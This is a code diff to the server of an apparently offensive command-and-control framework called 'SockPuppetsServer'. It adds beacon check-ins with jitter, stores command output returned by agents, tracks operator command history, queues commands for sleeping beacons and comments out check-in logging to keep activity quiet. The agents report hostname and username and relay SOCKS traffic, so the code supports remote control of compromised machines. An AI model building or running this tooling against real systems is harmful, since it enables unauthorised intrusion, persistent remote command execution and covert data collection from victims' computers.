@@ -33,9 +33,12 @@ class Agent:
         self.socks_data_queue = asyncio.Queue()
         self.mode = metadata.get('mode', 'streaming')  # 'beacon' or 'streaming'
         self.beacon_interval = metadata.get('beacon_interval', 60)
+        self.beacon_jitter = metadata.get('beacon_jitter', 0)
+        self.pending_results = []  # Store results from beacon checkins
+        self.command_history = []  # Track commands sent
 
     def get_info(self) -> dict:
-        return {
+        info = {
             'id': self.agent_id,
             'hostname': self.metadata.get('hostname', 'Unknown'),
             'username': self.metadata.get('username', 'Unknown'),
@@ -46,6 +49,9 @@ class Agent:
             'mode': self.mode,
             'beacon_interval': self.beacon_interval if self.mode == 'beacon' else 'N/A'
         }
+        if self.mode == 'beacon' and self.beacon_jitter > 0:
+            info['beacon_jitter'] = f"{self.beacon_jitter}%"
+        return info
 
 
 class SockPuppetsServer:
@@ -109,6 +115,47 @@ class SockPuppetsServer:
                         # Start command handler for this agent
                         asyncio.create_task(self.send_commands(agent_id))
 
+                    elif msg_type == 'checkin':
+                        # Beacon checking in with existing agent_id
+                        agent_id = data.get('agent_id')
+                        if agent_id and agent_id in self.agents:
+                            # Update existing agent's connection
+                            agent = self.agents[agent_id]
+                            agent.websocket = websocket
+                            agent.last_seen = datetime.now()
+                            self.active_connections.add(websocket)
+
+                            # Update metadata if provided
+                            metadata = data.get('metadata', {})
+                            if metadata:
+                                agent.mode = metadata.get('mode', agent.mode)
+                                agent.beacon_interval = metadata.get('beacon_interval', agent.beacon_interval)
+                                agent.beacon_jitter = metadata.get('beacon_jitter', agent.beacon_jitter)
+
+                            # Silent checkin - don't spam logs
+                            # logger.info(f"Agent {agent_id} checked in ({agent.metadata.get('hostname', 'Unknown')})")
+
+                            response = {
+                                'type': 'checkin_ack',
+                                'agent_id': agent_id,
+                                'status': 'success'
+                            }
+
+                            # Note: send_commands task already running from initial registration
+                            # It will automatically send any queued commands
+                        else:
+                            # Agent ID not found, treat as new registration
+                            agent_id = await self.register_agent(websocket, data)
+                            response = {
+                                'type': 'registered',
+                                'agent_id': agent_id,
+                                'status': 'success'
+                            }
+                            asyncio.create_task(self.send_commands(agent_id))
+
+                        encrypted_response = self.simple_encrypt(json.dumps(response))
+                        await websocket.send(encrypted_response)
+
                     elif msg_type == 'heartbeat':
                         if agent_id and agent_id in self.agents:
                             self.agents[agent_id].last_seen = datetime.now()
@@ -118,8 +165,28 @@ class SockPuppetsServer:
 
                     elif msg_type == 'response':
                         if agent_id and agent_id in self.agents:
-                            await self.agents[agent_id].response_queue.put(data.get('output', ''))
-                            self.agents[agent_id].last_seen = datetime.now()
+                            agent = self.agents[agent_id]
+                            output = data.get('output', '')
+                            command = data.get('command', '')
+                            timestamp = data.get('timestamp', '')
+
+                            # Store result for beacon mode
+                            agent.pending_results.append({
+                                'command': command,
+                                'output': output,
+                                'timestamp': timestamp,
+                                'received_at': datetime.now().isoformat()
+                            })
+
+                            # Also put in response queue for streaming mode or immediate response
+                            try:
+                                agent.response_queue.put_nowait(output)
+                            except asyncio.QueueFull:
+                                pass  # Queue full, result is stored in pending_results anyway
+
+                            agent.last_seen = datetime.now()
+                            # Log result arrival (helpful for debugging)
+                            logger.debug(f"Result received from {agent_id}: {command[:50]}...")
 
                     elif msg_type == 'socks_data':
                         if agent_id and agent_id in self.agents:
@@ -178,13 +245,23 @@ class SockPuppetsServer:
 
         agent = self.agents[agent_id]
 
-        if agent.websocket not in self.active_connections:
-            return "Agent is not connected"
+        # Track command
+        agent.command_history.append({
+            'command': command,
+            'queued_at': datetime.now().isoformat()
+        })
 
         # Queue the command
         await agent.command_queue.put(command)
 
-        # Wait for response with timeout
+        # For beacon mode, return immediately
+        if agent.mode == 'beacon':
+            return f"[*] Command queued for beacon (will execute on next checkin in ~{agent.beacon_interval}s)"
+
+        # For streaming mode, wait for response
+        if agent.websocket not in self.active_connections:
+            return "Agent is not connected"
+
         try:
             response = await asyncio.wait_for(agent.response_queue.get(), timeout=30.0)
             return response
@@ -202,6 +279,19 @@ class SockPuppetsServer:
             if agent.websocket in self.active_connections:
                 active.append(agent.get_info())
         return active
+
+    def get_agent_results(self, agent_id: str, clear: bool = False) -> list:
+        """Get pending results from agent"""
+        if agent_id not in self.agents:
+            return []
+
+        agent = self.agents[agent_id]
+        results = agent.pending_results.copy()
+
+        if clear:
+            agent.pending_results.clear()
+
+        return results
 
     async def set_beacon_interval(self, agent_id: str, interval: int) -> str:
         """Set beacon sleep interval for agent"""
